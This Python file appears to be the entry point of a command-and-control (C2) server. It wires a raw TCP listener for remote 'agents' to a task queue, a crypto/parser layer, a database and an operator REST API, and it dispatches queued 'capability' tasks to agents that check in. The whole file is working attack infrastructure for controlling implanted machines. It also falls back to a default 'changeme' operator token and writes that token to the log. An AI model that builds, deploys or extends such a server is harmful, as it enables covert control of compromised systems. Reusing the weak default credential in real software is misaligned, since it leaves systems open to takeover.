"""
Server entry point.
Wires all five components together:
  Agent traffic  ->  ConnectionHandler  ->  DataParserCrypto  ->  TaskQueue  ->  DB
  Operator CLI   ->  OperatorAPI (REST)  ->  TaskQueue  ->  DB
"""

import json
import logging
import os
import signal
import sys
import threading

import capabilities
from connection_handler import TcpConnectionHandler
from data_parser_crypto import DataParserCrypto
from database import AgentStore, KeyStore, TaskStore, init_db
from operator_api import OperatorApiServer, create_app
from task_queue import TaskQueue

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-8s  %(name)s  %(message)s",
)
log = logging.getLogger("main")

AGENT_LISTENER_HOST = "0.0.0.0"
AGENT_LISTENER_PORT = 9000

OPERATOR_API_HOST = "127.0.0.1"
OPERATOR_API_PORT = 9001

OPERATOR_AUTH_TOKEN = os.environ.get("C2_OPERATOR_TOKEN", "changeme")


def make_agent_handler(dpc: DataParserCrypto, agent_store: AgentStore,
                       task_queue: TaskQueue):

    def handle(agent_id: str, raw: bytes) -> bytes:
        msg = dpc.decode(raw)

        if msg != "keepalive":
            log.warning("Unexpected message from %s: %r", agent_id, msg)
            return dpc.encode("OK")

        agent_store.register(agent_id,
                             hostname="unknown", ip="unknown", os_info="unknown")

        next_task = task_queue.dequeue(agent_id)
        if next_task:
            log.info("Dispatching task %s (%s) to agent %s",
                     next_task["id"], next_task["capability"], agent_id)
            return dpc.encode(next_task["capability"])

        return dpc.encode("OK")

    return handle


def main():
    init_db()

    agent_store = AgentStore()
    task_store  = TaskStore()
    key_store   = KeyStore()
    task_queue  = TaskQueue(agent_store, task_store)
    dpc         = DataParserCrypto()

    conn_handler = TcpConnectionHandler()
    conn_handler.set_message_callback(
        make_agent_handler(dpc, agent_store, task_queue)
    )

    operator_app = create_app(agent_store, task_store, key_store, task_queue,
                              OPERATOR_AUTH_TOKEN)
    api_server = OperatorApiServer(operator_app)

    conn_handler.start(AGENT_LISTENER_HOST, AGENT_LISTENER_PORT)
    api_server.start(OPERATOR_API_HOST, OPERATOR_API_PORT)

    log.info("C2 server running.")
    log.info("  Agent listener : tcp://%s:%d  (raw TCP)",
             AGENT_LISTENER_HOST, AGENT_LISTENER_PORT)
    log.info("  Operator API   : http://%s:%d", OPERATOR_API_HOST, OPERATOR_API_PORT)
    log.info("  Operator token : %s", OPERATOR_AUTH_TOKEN)

    stop_event = threading.Event()

    def _shutdown(sig, frame):
        log.info("Shutting down...")
        conn_handler.stop()
        api_server.stop()
        stop_event.set()

    signal.signal(signal.SIGINT, _shutdown)
    if hasattr(signal, "SIGTERM"):
        signal.signal(signal.SIGTERM, _shutdown)

    try:
        while not stop_event.is_set():
            stop_event.wait(1.0)
    except KeyboardInterrupt:
        _shutdown(signal.SIGINT, None)
    sys.exit(0)


if __name__ == "__main__":
    main()
